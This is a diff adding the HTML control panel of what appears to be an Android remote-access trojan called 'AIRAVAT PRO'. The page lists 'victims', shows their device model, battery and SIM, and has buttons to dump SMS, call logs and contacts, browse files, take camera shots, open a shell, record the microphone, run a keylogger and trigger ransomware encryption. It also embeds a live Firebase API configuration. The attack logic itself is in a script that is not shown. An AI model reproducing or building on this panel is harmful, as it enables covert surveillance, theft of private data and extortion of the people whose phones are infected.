@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>AIRAVAT PRO | Command Center</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="./style.css">
+    
+    <script src="./firebase-app.js"></script>
+    <script src="./firebase-auth.js"></script>
+    <script src="./jquery.js"></script>
+    <script src="./firebase-database.js"></script>
+
+    <script type="text/javascript">
+        // --- APNA FIREBASE DETAILS YAHAN RE-PASTE KAREIN ---
+        const firebaseConfig = {
+  apiKey: "AIzaSyApcsLwwHVlgefAOn-GFKbh52pOTxAcCDs",
+  authDomain: "airavatr.firebaseapp.com",
+  databaseURL: "https://airavatr-default-rtdb.firebaseio.com",
+  projectId: "airavatr",
+  storageBucket: "airavatr.firebasestorage.app",
+  messagingSenderId: "302932063564",
+  appId: "1:302932063564:web:7b5634105bc9f269bc4be9",
+  measurementId: "G-2XN7TBEQSB"
+};
+    </script>
+</head>
+<body>
+
+<div class="sidebar">
+    <div class="brand">
+        <i class="fas fa-dragon"></i> <span>AIRAVAT PRO</span>
+    </div>
+    <ul class="nav-links">
+        <li onclick="logsout()"><i class="fas fa-sign-out-alt"></i> Logout</li>
+        <li onclick="clrn()"><i class="fas fa-bell-slash"></i> Clear Noti</li>
+        <li onclick="clrk()"><i class="fas fa-keyboard"></i> Clear Keys</li>
+        <li onclick="clrr()"><i class="fas fa-microphone-slash"></i> Clear Rec</li>
+    </ul>
+</div>
+
+<div class="main-content">
+    
+    <div class="stats-container" id="victim-info">
+        <div class="stat-card">
+            <i class="fas fa-mobile-alt"></i>
+            <div class="info">
+                <small>Device Model</small>
+                <h5 id="dev-model">Waiting...</h5>
+            </div>
+        </div>
+        <div class="stat-card">
+            <i class="fas fa-battery-three-quarters"></i>
+            <div class="info">
+                <small>Battery Status</small>
+                <h5 id="dev-battery">0%</h5>
+            </div>
+        </div>
+        <div class="stat-card">
+            <i class="fas fa-network-wired"></i>
+            <div class="info">
+                <small>Network / SIM</small>
+                <h5 id="dev-sim">Unknown</h5>
+            </div>
+        </div>
+    </div>
+
+    <div class="control-grid">
+        <div class="card-header"><h4><i class="fas fa-terminal"></i> Command Center</h4></div>
+        <div class="grid-container">
+            <div class="btn-item" onclick="calllogs()"><i class="fas fa-phone"></i><span>Calls</span></div>
+            <div class="btn-item" onclick="dumpsms()"><i class="fas fa-sms"></i><span>SMS</span></div>
+            <div class="btn-item" onclick="filesmanager()"><i class="fas fa-folder-open"></i><span>Files</span></div>
+            <div class="btn-item" onclick="camss()"><i class="fas fa-camera"></i><span>Camera</span></div>
+            <div class="btn-item" onclick="toggleFlashlight()" style="color: #ffca28;"><i class="fas fa-bolt"></i><span>Flashlight</span></div>
+            <div class="btn-item" onclick="startshell()"><i class="fas fa-code"></i><span>Shell</span></div>
+            <div class="btn-item" onclick="notificationlog()"><i class="fas fa-bell"></i><span>Noti Logs</span></div>
+            <div class="btn-item" onclick="keylogger()"><i class="fas fa-keyboard"></i><span>Keylogger</span></div>
+            <div class="btn-item" onclick="micrec()"><i class="fas fa-microphone"></i><span>Record</span></div>
+            <div class="btn-item" onclick="deviceinfo()"><i class="fas fa-info-circle"></i><span>SysInfo</span></div>
+            <div class="btn-item" onclick="dumpcontact()"><i class="fas fa-address-book"></i><span>Contacts</span></div>
+            <div class="btn-item" onclick="ransomwares()" style="color: #f44336;"><i class="fas fa-lock"></i><span>Encrypt</span></div>
+        </div>
+    </div>
+
+    <div class="bottom-area">
+        <div class="victim-list-card" id="users">
+            <h5>Victim List</h5>
+            <div class="loader">Getting list...</div>
+        </div>
+        <div class="log-display-card" id="resp">
+            <h5>Response Terminal</h5>
+            <div id="resp-data">Select a command to see results...</div>
+        </div>
+    </div>
+
+</div>
+
+<script src="./script.js"></script>
+</body>
+</html>
